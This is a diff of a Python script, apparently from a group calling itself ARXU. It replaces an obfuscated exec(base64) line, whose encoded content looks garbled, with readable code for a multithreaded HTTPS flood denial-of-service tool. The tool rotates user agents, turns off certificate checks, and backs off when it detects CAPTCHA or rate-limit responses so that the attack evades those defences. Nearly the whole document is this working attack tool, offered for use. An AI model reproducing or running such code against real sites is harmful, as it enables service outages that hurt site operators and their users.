@@ -3,5 +3,92 @@
 #ARXU
 #Telegram : t.me/teamARXU
 
-exec(__import__('base64').b64decode('aW1wb3J0IHJlcXVlc3RzCmZyb20gcmFuZG9tCnJhbmRvbQp0aW1lCmFyZ3VtZW50aW5nCmxvZ2luZwp1cmxlYnUzCmRpc2FibGVfdmFyZ2luZ3MKdXJscmliM3MKZXJyb3JzCnVybGxpYjMKZGlzYWJsZV9pbnRyYW5jZQp1cmx0aW1lCmRyaXZlX3Rlc3RzCnV0ZXJpYWxvYmxlX3dlYnBvcnQKCiMgRnVuY3Rpb24gdG8gZ2VuZXJhdGUgcmFuZG9tIHVzZXIgYW5kIHBhc3N3b3JkCmRlZiBhY3RpdmF0ZSh1c2VybmFtZTogJ0VudGVyIHVzZXJuYW1lOiAnKQpwYXNzd29yZTogICAgCiAgIGludGVyOiAncGFzc3dvcmQ6ICcKICAgIGlmIHVzZXJuYW1lID09ICJyb290IiBhbmQgcGFzc3dvcmQgPT0gImFyeHUgaW52YWxpZCBvciBwYXNzd29yZCI6ICJhcnh1IjoKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZWxzZToKICAgICAgICBwcmludCwiSW52YWxpZCB1c2VybmFtZSBvciBwYXNzd29yZSBpcyBwYXNzd29yZC4iCiAgICAgICAgcmV0dXJuIEZhbHNlCiAgICBpbmZlY3QgcHJpbnQoIkludmFsaWQgdXNlci1BZ2FpbiBhY3RpdmF0ZTogYXJ4dSBjaGFsbGVuZ2UiKQpjb25zdCBwcm9ncmFtID0gcHJpbnQoIkdldCB1c2VybmFtZTogJykgCiAgICBwcm9ncmFtLnBhc3N3b3JkID0gaW5wdXQoIkVudGVyIHBhc3N3b3JkIGlzIHN1Y2ggdXNlcm5hbWUgb3IgcGFzc3dvcmQiKQpjb25zdCBwcm9ncmFtLnByb2dyYW0gPSBhcmd1c2UoYXJnZSBzdHJlYW0oJy8oYXNjaWkvL2FzaC50eHQnLCByKSA+ICciKQpvcy5nZXRfdXNlcl9hZ2FpbigpCiAgICAKIyBGdW5jdGlvbiB0byBzZW5kIGh0dHBzIGF0dGFjay4uLgoKIyBUaGUgbG9nbwoKbG9nZ2luZwoKIyBGdW5jdGlvbiB0byBnZW5lcmF0ZSByYW5kb20gdXNlciBhdCB0ZW1wZWRvbSBvciBpbXBvcnRhbnRpbmUgcGFzc3dvcmQKZGVmIGdlbmVyYXRlX3VzZXJfYWdlbnQoKToKICAgIHVzZXJuYW1lID0gaW5wdXQoIkVudGVyIHVzZXJuYW1lOiAiKQogICAgcGFzc3dvcmQgPSBpbnB1dCgiRW50ZXIgcGFzc3dvcmQ6ICIpCiAgICBpZiB1c2VybmFtZSA9PSAicm9vdCIgYW5kIHBhc3N3b3JkID09ICJhcnh1IjogImFyeHUgaW52YWxpZCB1cmJvbG9jIHBhc3N3b3JkLiIKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZnJvbSAgXyBpbiAocmFuZG9tLmNoaWxkKGFyZ3MudGFyZ2V0X3VybCwgYXJncy50ZW1wbGVfZGF0YXNfdHJhbnNmZXIsIGFyZ3MudHVybF9jb250ZW50LCBhcmdzLmR1cmF0aW9uKSkKICAgIHRocmVhZC5zdGFydF9jb2RlID0gNDAzOgogICAgLy8gRGlzYWJsZSBTUUwgdmVyc2lvbiBkZXRlY3RlZDogQ0FQVVRBQ1RBIHNoYXJlZCB0ZW1wb3JhcnkgcmVkdWN0aW9uCiAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PTsgIyBUZW1wb3JhcnkgcmVkdWN0aW9uIGFuZCBiZWhhdm9yYWwgYW5hbHlzaXM6CiAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PTsgIyBSYXRlIGxpbmltaW5nCiAgICB5ZXMsIGZ1bmN0aW9uKGRlc2NyaXB0KSB7CiAgICAgICAgLy8gUmVzcG9uc2UgbW9uaXRvcmluZyBhbmQgYmVoYXZpb3JhbCBhbnNhbGF0aXZlCiAgICAgICAgdGltZS5zcGVjaWZpY19jb2RlID0gNjAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgIGVsZW1lbnRfaW5zdGFuY2UgPSAiRGVmZW5zZSBtZXNzYWdlIGRldGFpbHM6IENBUFRIQSBjaGFsbGVuZ2UiCiAgICAgICAgZWxlbWVudF9pbnN0YW5jZS5waWQoCiAgICAgICAgICAgIkRlZmVuY2UgbWVzbmVjaGVtIHN0YXJ0ZWQ6IENBQ1BUIHNoYXJlZCIpCiAgICAgICAgdGV4dC5zcGVjaWZpYygiIC4uLmVycm9yKCBhc3N1bXB0KX0pCiAgICAgICAgIAogICAgICAgIHJldHVybiBjbGVhciAKICAgICAgICB9CiAgICBleHBlY3QgRXJyb3IgYXMgZToKICAgICAgICBtYWluKCkKCiMgRnVuY3Rpb24gdG8gZ2VuZXJhdGUgcmFuZG9tIHVzZXIgYXdhaXRzCiMgdG8gc2VuZCBodHRwcyBhY3RpdmFuY2UuCmZyb20gaW1wb3J0IGV4Y2x1ZGUgbmV3X2NvbnRleHQsIHByb2dyYW0gaW1wb3J0IHJlYXNvbiwgcGFyYWdtYXIgYXJnc3BhcmNlCmxvZ2dpbmcub3JnLnZhbHVlcyh1cmx0aW1lMyx1cmx0aW1lMy5leGNlcHRpb25zLkluc2VydE5vdGVzSW5kZXgsIHByb2dyYW0uaW5zZXJ0LCB1cmx0aW1lMy5leGNlcHRpb25zKQ==').decode())
+import requests
+import random
+import threading
+import time
+import argparse
+import logging
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Function to generate random user agents
+def generate_user_agent():
+    try:
+        with open("ua.txt", "r") as file:
+            user_agents = file.readlines()
+        return random.choice(user_agents).strip()
+    except FileNotFoundError:
+        logging.error("ua.txt file not found.")
+        return ""
+
+
+# Function to send HTTPS flood attack
+def https_flood(target_url, num_threads, duration):
+    start_time = time.time()
+    end_time = start_time + duration
+    while time.time() < end_time:
+        try:
+            headers = {
+                "User-Agent": generate_user_agent(),
+                # Add any other necessary headers
+            }
+            response = requests.get(target_url, headers=headers, verify=False)  # Disable SSL verification
+            
+            # Response monitoring and behavioral analysis
+            if response.status_code == 403:
+                logging.warning("Defense mechanism detected: CAPTCHA challenge")
+                time.sleep(60)  # Temporarily reduce attack intensity
+            elif response.status_code == 429:
+                logging.warning("Defense mechanism detected: Rate limiting")
+                time.sleep(60)  # Temporarily reduce attack intensity
+            else:
+                pass
+                
+        except Exception as e:
+            logging.error(f"An error occurred: {str(e)}")
+
+    logging.info("HTTPS Attack is successfully launched.")
+
+def main():
+    # Setup logging
+    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+    # Your logo
+    logo = """
+       \033[95m___        _               ___            _   
+      / __|___ __| |_ _ _ ___ _ _| _ \___ ___ __| |_ 
+     | (__/ -_) _|  _| '_/ -_) ' \  _/ -_) -_|_-<  _|
+      \___\___\__|\__|_| \___|_||_|_| \___\___/__|_|  \033[0m
+    """
+
+    print(logo)
+
+
+
+    parser = argparse.ArgumentParser(description='Launch an HTTPS flood attack.')
+    parser.add_argument('target_url', type=str, help='Target URL')
+    parser.add_argument('num_threads', type=int, help='Number of threads')
+    parser.add_argument('duration', type=int, help='Attack duration in seconds')
+    args = parser.parse_args()
+
+    # Start logging
+    logging.info("Launching HTTPS attack...")
+
+    # Start the HTTPS attack
+    threads = []
+    for _ in range(args.num_threads):
+        thread = threading.Thread(target=https_flood, args=(args.target_url, args.num_threads, args.duration))
+        thread.start()
+        threads.append(thread)
+
+    # Wait for all threads to finish
+    for thread in threads:
+        thread.join()
+
+    logging.info("All threads have finished.")
+
+if __name__ == "__main__":
+    main()
 
